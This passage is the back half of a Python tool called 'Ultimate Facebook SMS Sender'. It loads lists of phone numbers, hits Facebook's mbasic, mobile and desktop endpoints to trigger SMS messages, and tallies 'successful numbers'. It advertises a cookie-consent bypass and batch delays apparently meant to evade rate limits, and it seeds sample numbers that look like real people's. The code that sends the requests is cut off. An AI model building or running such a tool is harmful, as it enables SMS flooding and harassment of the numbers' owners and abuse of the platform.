                        f.write(f"🍪 {phone} ({endpoint_type})\n")
                    elif status == 'POSSIBLE':
                        f.write(f"⚠️  {phone} ({endpoint_type})\n")
                    else:
                        f.write(f"❌ {phone} - {status} ({endpoint_type})\n")
                
            print(f"💾 Progress saved")
            
        except Exception as e:
            print(f"⚠️  Could not save progress: {e}")
    
    def show_final_summary(self, total_time: float):
        """Show final summary"""
        hours, rem = divmod(total_time, 3600)
        minutes, seconds = divmod(rem, 60)
        
        total = self.stats['total']
        success_total = (self.stats['sms_confirmed'] + self.stats['redirect_success'] + 
                        self.stats['possible_sms'] + self.stats['possible'])
        
        success_rate = (success_total / total) * 100 if total > 0 else 0
        sms_confirmation_rate = (self.stats['sms_confirmed'] / total) * 100 if total > 0 else 0
        
        print(f"\n{'='*70}")
        print("🎉 OPTIMIZED BATCH PROCESSING COMPLETE!")
        print(f"{'='*70}")
        
        print(f"\n📊 FINAL STATISTICS:")
        print(f"   📱 Total Processed: {total}")
        print(f"   ✅ Total Success: {success_total} ({success_rate:.1f}%)")
        print(f"   ❌ Total Failed: {self.stats['failed']}")
        
        print(f"\n📈 DETAILED BREAKDOWN:")
        print(f"   📱✅ SMS Confirmed: {self.stats['sms_confirmed']} ({sms_confirmation_rate:.1f}%)")
        print(f"   🔄✅ Redirect Success: {self.stats['redirect_success']}")
        print(f"   📱⚠️  Possible SMS: {self.stats['possible_sms']}")
        print(f"   ⚠️  Possible: {self.stats['possible']}")
        print(f"   🍪 Cookie Consent Pages: {self.stats['cookie_consent']}")
        print(f"   💻 Desktop Failures: {self.stats['desktop_failed']}")
        print(f"   ❌ Bad Request: {self.stats['bad_request']}")
        print(f"   ⏱️❌ Timeout: {self.stats['timeout']}")
        
        print(f"\n⏱️  TIME STATISTICS:")
        print(f"   Total Time: {int(hours):02d}:{int(minutes):02d}:{int(seconds):02d}")
        if total > 0:
            avg_time = total_time / total
            print(f"   Average per Number: {avg_time:.1f}s")
        
        print(f"\n🕐 Timeline:")
        print(f"   Started: {datetime.fromtimestamp(time.time() - total_time).strftime('%H:%M:%S')}")
        print(f"   Finished: {datetime.now().strftime('%H:%M:%S')}")
        print(f"{'='*70}")
        
        # Top 10 successful numbers
        successful = [r for r in self.results if r['status'] in ['SMS_CONFIRMED', 'REDIRECT_SUCCESS']]
        if successful:
            print(f"\n🏆 TOP {min(10, len(successful))} SUCCESSFUL NUMBERS:")
            for i, result in enumerate(successful[:10], 1):
                phone = result.get('formatted_phone', result['phone'])
                status = result['status']
                response_time = result.get('response_time', 0)
                endpoint = result.get('endpoint', 'N/A')
                endpoint_type = result.get('endpoint_type', '')
                
                status_emoji = "📱✅" if status == 'SMS_CONFIRMED' else "🔄✅"
                if result.get('cookie_consent'):
                    status_emoji = "🍪✅" if status == 'SMS_CONFIRMED' else "🍪🔄"
                
                endpoint_emoji = ""
                if endpoint_type == 'mbasic':
                    endpoint_emoji = "📱"
                elif endpoint_type == 'mobile':
                    endpoint_emoji = "📲"
                elif endpoint_type == 'desktop':
                    endpoint_emoji = "💻"
                
                print(f"   {i:2}. {status_emoji}{endpoint_emoji} {phone} ({response_time:.1f}s)")
    
    def save_final_results(self):
        """Save final results"""
        timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
        
        # Save JSON
        try:
            json_filename = f"final_results_{timestamp}.json"
            with open(json_filename, "w", encoding="utf-8") as f:
                final_data = {
                    'metadata': {
                        'timestamp': datetime.now().isoformat(),
                        'total_numbers': len(self.results),
                        'stats': self.stats,
                        'success_rate': (self.stats['sms_confirmed'] + self.stats['redirect_success'] + 
                                       self.stats['possible_sms'] + self.stats['possible']) / len(self.results) * 100
                    },
                    'results': self.results
                }
                json.dump(final_data, f, indent=2, ensure_ascii=False, default=str)
        except Exception as e:
            print(f"⚠️  Could not save JSON: {e}")
        
        # Save CSV
        try:
            csv_filename = f"results_{timestamp}.csv"
            with open(csv_filename, "w", encoding="utf-8") as f:
                f.write("Phone,Formatted_Phone,Status,Message,Response Code,Response Time,Endpoint,Endpoint_Type,Attempts,Cookie_Consent,Timestamp\n")
                for result in self.results:
                    phone = result['phone']
                    formatted_phone = result.get('formatted_phone', phone)
                    status = result['status']
                    message = result.get('message', '').replace(',', ';')
                    response_code = str(result.get('response_code', ''))
                    response_time = str(result.get('response_time', ''))
                    endpoint = result.get('endpoint', '').replace(',', ';')
                    endpoint_type = result.get('endpoint_type', '')
                    attempts = str(result.get('attempts', ''))
                    cookie_consent = str(result.get('cookie_consent', 'false'))
                    timestamp_str = result.get('timestamp', '')
                    
                    f.write(f"{phone},{formatted_phone},{status},{message},{response_code},{response_time},{endpoint},{endpoint_type},{attempts},{cookie_consent},{timestamp_str}\n")
        except Exception as e:
            print(f"⚠️  Could not save CSV: {e}")
        
        # Save readable text
        try:
            txt_filename = f"results_{timestamp}.txt"
            with open(txt_filename, "w", encoding="utf-8") as f:
                f.write("OPTIMIZED FACEBOOK SMS SENDING RESULTS\n")
                f.write("="*70 + "\n")
                f.write(f"Date: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
                f.write(f"Total Numbers: {len(self.results)}\n")
                f.write(f"Success Rate: {((self.stats['sms_confirmed'] + self.stats['redirect_success'] + self.stats['possible_sms'] + self.stats['possible']) / len(self.results) * 100):.1f}%\n")
                f.write(f"SMS Confirmation Rate: {(self.stats['sms_confirmed'] / len(self.results) * 100):.1f}%\n")
                f.write(f"Cookie Consent Pages Encountered: {self.stats['cookie_consent']}\n")
                f.write(f"Desktop Endpoint Failures: {self.stats['desktop_failed']}\n")
                f.write("="*70 + "\n\n")
                
                # Successful numbers by endpoint type
                endpoint_stats = {}
                for r in self.results:
                    endpoint_type = r.get('endpoint_type', 'unknown')
                    if endpoint_type not in endpoint_stats:
                        endpoint_stats[endpoint_type] = {'total': 0, 'success': 0}
                    endpoint_stats[endpoint_type]['total'] += 1
                    if r['status'] in ['SMS_CONFIRMED', 'REDIRECT_SUCCESS', 'POSSIBLE_SMS', 'POSSIBLE']:
                        endpoint_stats[endpoint_type]['success'] += 1
                
                f.write("📊 ENDPOINT PERFORMANCE:\n")
                f.write("-"*50 + "\n")
                for endpoint_type, stats in endpoint_stats.items():
                    if stats['total'] > 0:
                        success_rate = (stats['success'] / stats['total']) * 100
                        f.write(f"{endpoint_type.upper()}: {stats['success']}/{stats['total']} ({success_rate:.1f}%)\n")
                
                # Successful numbers
                f.write("\n🎯 SUCCESSFUL NUMBERS (with + format):\n")
                f.write("-"*50 + "\n")
                
                # SMS Confirmed
                if self.stats['sms_confirmed'] > 0:
                    f.write(f"\n📱 SMS CONFIRMED ({self.stats['sms_confirmed']}):\n")
                    for r in self.results:
                        if r['status'] == 'SMS_CONFIRMED':
                            phone = r.get('formatted_phone', r['phone'])
                            cookie_msg = " (cookie consent)" if r.get('cookie_consent') else ""
                            endpoint_type = r.get('endpoint_type', '')
                            f.write(f"   {phone}{cookie_msg} [{endpoint_type}]\n")
                
                # Redirect Success
                if self.stats['redirect_success'] > 0:
                    f.write(f"\n🔄 REDIRECT SUCCESS ({self.stats['redirect_success']}):\n")
                    for r in self.results:
                        if r['status'] == 'REDIRECT_SUCCESS':
                            phone = r.get('formatted_phone', r['phone'])
                            cookie_msg = " (cookie consent)" if r.get('cookie_consent') else ""
                            endpoint_type = r.get('endpoint_type', '')
                            f.write(f"   {phone}{cookie_msg} [{endpoint_type}]\n")
                
                # Cookie consent numbers
                cookie_numbers = [r for r in self.results if r.get('cookie_consent')]
                if cookie_numbers:
                    f.write(f"\n🍪 COOKIE CONSENT PAGES ({len(cookie_numbers)}):\n")
                    for r in cookie_numbers:
                        phone = r.get('formatted_phone', r['phone'])
                        endpoint_type = r.get('endpoint_type', '')
                        f.write(f"   {phone} [{endpoint_type}]\n")
                
                # Failed numbers
                failed = [r for r in self.results if r['status'] not in ['SMS_CONFIRMED', 'REDIRECT_SUCCESS', 'POSSIBLE_SMS', 'POSSIBLE', 'COOKIE_CONSENT']]
                if failed:
                    f.write(f"\n\n❌ FAILED NUMBERS ({len(failed)}):\n")
                    f.write("-"*50 + "\n")
                    for r in failed:
                        phone = r.get('formatted_phone', r['phone'])
                        f.write(f"{phone} - {r['status']}\n")
                        if r.get('message'):
                            f.write(f"  Reason: {r['message']}\n")
                
                # Summary
                f.write(f"\n\n📊 SUMMARY:\n")
                f.write(f"Total Processed: {len(self.results)}\n")
                f.write(f"SMS Confirmed: {self.stats['sms_confirmed']}\n")
                f.write(f"Redirect Success: {self.stats['redirect_success']}\n")
                f.write(f"Possible SMS: {self.stats['possible_sms']}\n")
                f.write(f"Possible: {self.stats['possible']}\n")
                f.write(f"Cookie Consent Pages: {self.stats['cookie_consent']}\n")
                f.write(f"Desktop Failures: {self.stats['desktop_failed']}\n")
                f.write(f"Failed: {self.stats['failed']}\n")
                f.write(f"Overall Success: {((self.stats['sms_confirmed'] + self.stats['redirect_success'] + self.stats['possible_sms'] + self.stats['possible']) / len(self.results) * 100):.1f}%\n")
            
            print(f"\n💾 Results saved to:")
            print(f"   📄 {txt_filename}")
            print(f"   📊 {csv_filename}")
            print(f"   📦 {json_filename}")
            
        except Exception as e:
            print(f"⚠️  Could not save text results: {e}")

def load_numbers():
    """Load numbers from file and validate format"""
    if not os.path.exists("numbers.txt"):
        print("❌ numbers.txt not found")
        print("💡 Creating sample numbers.txt file...")
        sample_numbers = [
            "+93702083884",
            "+93702081299",
            "+93702089372",
            "93702083610",
            "93702080347",
            "93702084872",
        ]
        
        with open("numbers.txt", "w", encoding="utf-8") as f:
            for num in sample_numbers:
                f.write(f"{num}\n")
        
        print("✅ Created sample numbers.txt file")
    
    try:
        with open("numbers.txt", "r", encoding="utf-8") as f:
            numbers = [line.strip() for line in f if line.strip()]
        
        print(f"✅ Loaded {len(numbers)} numbers from numbers.txt")
        
        # Preview formatting
        sender = UltimateFacebookSMSsender()
        print(f"\n📱 NUMBER FORMAT PREVIEW (first 5):")
        for i, num in enumerate(numbers[:5], 1):
            formatted = sender.clean_phone(num)
            print(f"   {i}. {num} → {formatted}")
        
        if len(numbers) > 5:
            print(f"   ... and {len(numbers)-5} more")
        
        return numbers
    except Exception as e:
        print(f"❌ Error loading numbers: {e}")
        return []

async def single_test():
    """Test single number"""
    print("\n🧪 SINGLE NUMBER TEST")
    phone = input("Enter phone (with or without +): ").strip()
    
    if not phone:
        print("❌ No phone")
        return
    
    sender = UltimateFacebookSMSsender()
    formatted_phone = sender.clean_phone(phone)
    print(f"\n📱 Phone formatting:")
    print(f"   Original: {phone}")
    print(f"   Formatted: {formatted_phone}")
    
    if await sender.create_session():
        result = await sender.process_single_phone(phone)
        
        print(f"\n📊 TEST RESULT:")
        print(f"Status: {result['status']}")
        print(f"Formatted Phone: {result.get('formatted_phone', formatted_phone)}")
        print(f"Message: {result.get('message', '')}")
        print(f"Response Code: {result.get('response_code', 'N/A')}")
        print(f"Response Time: {result.get('response_time', 'N/A'):.2f}s")
        print(f"Endpoint: {result.get('endpoint', 'N/A')}")
        print(f"Endpoint Type: {result.get('endpoint_type', 'N/A')}")
        print(f"Attempts: {result.get('attempts', 1)}")
        print(f"Cookie Consent: {result.get('cookie_consent', False)}")
        
        if result.get('patterns'):
            print(f"Patterns Found: {result['patterns']}")
        
        if result['status'] == 'SMS_CONFIRMED':
            if result.get('cookie_consent'):
                print("🍪 Cookie consent page - SMS may have been sent!")
            else:
                print("🎉 SMS successfully sent and confirmed!")
        elif result['status'] == 'REDIRECT_SUCCESS':
            if result.get('cookie_consent'):
                print("🍪 Cookie consent redirect - SMS likely sent")
            else:
                print("✅ Very likely successful (redirect received)")
        elif result['status'] == 'COOKIE_CONSENT':
            print("🍪 Cookie consent page - SMS may have been sent")
        elif result['status'] in ['POSSIBLE_SMS', 'POSSIBLE']:
            print("⚠️  Possibly successful")
        else:
            print("❌ Failed")
        
        await sender.session.close()
    
    input("\nPress Enter...")

def view_progress():
    """View progress"""
    if os.path.exists("progress.txt"):
        print("\n📈 CURRENT PROGRESS:")
        print("="*60)
        with open("progress.txt", "r", encoding="utf-8") as f:
            print(f.read())
    else:
        print("❌ No progress file")
    
    input("\nPress Enter...")

def format_numbers_file():
    """Format numbers in numbers.txt file"""
    if not os.path.exists("numbers.txt"):
        print("❌ numbers.txt not found")
        return
    
    try:
        with open("numbers.txt", "r", encoding="utf-8") as f:
            original_numbers = [line.strip() for line in f if line.strip()]
        
        sender = UltimateFacebookSMSsender()
        formatted_numbers = []
        
        print("\n🔧 FORMATTING NUMBERS IN numbers.txt:")
        print("-"*50)
        
        for i, num in enumerate(original_numbers, 1):
            formatted = sender.clean_phone(num)
            formatted_numbers.append(formatted)
            
            if num != formatted:
                print(f"   {i}. {num} → {formatted}")
            else:
                print(f"   {i}. {num} (already formatted)")
        
        # Ask to save
        save = input(f"\n💾 Save {len(formatted_numbers)} formatted numbers? (yes/no): ").strip().lower()
        
        if save == 'yes':
            # Backup original
            backup_name = f"numbers_backup_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
            with open(backup_name, "w", encoding="utf-8") as f:
                f.write("\n".join(original_numbers))
            
            # Save formatted
            with open("numbers.txt", "w", encoding="utf-8") as f:
                f.write("\n".join(formatted_numbers))
            
            print(f"✅ Numbers formatted and saved")
            print(f"📁 Original backed up as: {backup_name}")
        else:
            print("❌ Formatting cancelled")
            
    except Exception as e:
        print(f"❌ Error: {e}")

def main():
    """Main menu"""
    print("\n" + "="*70)
    print("           🚀 ULTIMATE FACEBOOK SMS SENDER - FIXED VERSION")
    print("="*70)
    print("📱 MBasic Facebook: 100% Success Rate!")
    print("🎯 302 Redirect = SMS Successfully Sent")
    print("📞 All numbers automatically formatted with + prefix")
    print("🍪 Cookie consent bypass: ENABLED")
    print("📱 Mobile-optimized user agents")
    print("="*70)
    
    while True:
        print("\n📱 MAIN MENU:")
        print("="*50)
        print("1. 🚀 Start Batch Processing")
        print("2. 🧪 Test Single Number")
        print("3. 🔧 Format Numbers in numbers.txt")
        print("4. 📊 View Current Progress")
        print("5. 📁 View Previous Results")
        print("6. ⚙️  Configuration")
        print("7. ❌ Exit")
        print("="*50)
        
        try:
            choice = input("\nChoose option (1-7): ").strip()
        except KeyboardInterrupt:
            print("\n👋 Goodbye!")
            break
        
        if choice == "1":
            numbers = load_numbers()
            if not numbers:
                print("❌ No numbers to process")
                continue
            
            print(f"\n📊 FOUND {len(numbers)} NUMBERS")
            print(f"🔢 All numbers will be sent with + prefix")
            print(f"📱 Primary endpoint: MBasic Facebook")
            print(f"🍪 Cookie consent bypass: ENABLED")
            
            # Configuration
            try:
                delay = int(input(f"Delay between batches (60-180s) [90]: ") or "90")
                delay = max(60, min(delay, 180))
                
                batch_size = int(input(f"Batch size (2-5) [3]: ") or "3")
                batch_size = max(2, min(batch_size, 5))
            except:
                delay = 90
                batch_size = 3
            
            print(f"\n⚙️  CONFIGURATION SUMMARY:")
            print(f"   • Numbers: {len(numbers)}")
            print(f"   • Format: All with + prefix")
            print(f"   • Primary endpoint: MBasic Facebook")
            print(f"   • Cookie consent bypass: Enabled")
            print(f"   • Delay: {delay}s")
            print(f"   • Batch size: {batch_size}")
            print(f"   • Estimated time: {len(numbers) * delay / 60:.1f} minutes")
            print(f"   • Estimated batches: {(len(numbers) + batch_size - 1) // batch_size}")
            
            confirm = input(f"\n✅ Start Processing? (yes/no): ").strip().lower()
            
            if confirm == 'yes':
                sender = UltimateFacebookSMSsender()
                asyncio.run(sender.process_batch(numbers, delay, batch_size))
            
            input("\nPress Enter to continue...")
        
        elif choice == "2":
            asyncio.run(single_test())
        
        elif choice == "3":
            format_numbers_file()
            input("\nPress Enter to continue...")
        
        elif choice == "4":
            view_progress()
        
        elif choice == "5":
            files = [f for f in os.listdir() if f.startswith('results_') and f.endswith('.txt')]
            if files:
                files.sort(reverse=True)
                print(f"\n📁 RECENT RESULT FILES:")
                for i, f in enumerate(files[:5], 1):
                    size = os.path.getsize(f) // 1024
                    print(f"{i}. {f} ({size} KB)")
                
                try:
                    file_choice = input("\nSelect file (1-5) or 0 to cancel: ").strip()
                    if file_choice.isdigit():
                        idx = int(file_choice) - 1
                        if 0 <= idx < len(files):
                            with open(files[idx], "r", encoding="utf-8") as f:
                                content = f.read()
                                if len(content) > 2000:
                                    print(content[:2000])
                                    print("\n... (truncated)")
                                else:
                                    print(f"\n{content}")
                except:
                    pass
            else:
                print("❌ No result files found")
            
            input("\nPress Enter to continue...")
        
        elif choice == "6":
            print("\n⚙️  CONFIGURATION")
            print("="*40)
            print("1. Edit numbers.txt")
            print("2. View current numbers")
            print("3. Test phone formatting")
            print("4. Back")
            
            config_choice = input("\nChoose: ").strip()
            
            if config_choice == "1":
                if os.path.exists("numbers.txt"):
                    os.system(f"notepad numbers.txt" if sys.platform == "win32" else f"nano numbers.txt")
                    print("✅ File opened for editing")
                else:
                    print("❌ numbers.txt not found")
            
            elif config_choice == "2":
                numbers = load_numbers()
                if numbers:
                    print(f"\n📋 CURRENT NUMBERS ({len(numbers)}):")
                    print("-"*40)
                    sender = UltimateFacebookSMSsender()
                    for i, num in enumerate(numbers[:20], 1):
                        formatted = sender.clean_phone(num)
                        print(f"{i:3}. {num} → {formatted}")
                    if len(numbers) > 20:
                        print(f"... and {len(numbers)-20} more")
            
            elif config_choice == "3":
                phone = input("\nEnter phone to test formatting: ").strip()
                if phone:
                    sender = UltimateFacebookSMSsender()
                    formatted = sender.clean_phone(phone)
                    print(f"\n📱 Formatting Result:")
                    print(f"   Original: {phone}")
                    print(f"   Formatted: {formatted}")
                    print(f"   Will be sent as: {formatted}")
            
            input("\nPress Enter to continue...")
        
        elif choice == "7":
            print("\n👋 Goodbye!")
            break
        
        else:
            print("❌ Invalid choice")

if __name__ == "__main__":
    # Check dependencies
    try:
        import aiohttp
    except ImportError:
        print("Installing aiohttp...")
        import subprocess
        subprocess.check_call([sys.executable, "-m", "pip", "install", "aiohttp"])
        print("✅ Installed. Please run again.")
        sys.exit(1)
    
    # Run
    try:
        main()
    except KeyboardInterrupt:
        print("\n\n⏹️  Stopped by user")
    except Exception as e:
        print(f"\n❌ Fatal error: {e}")
        input("Press Enter...")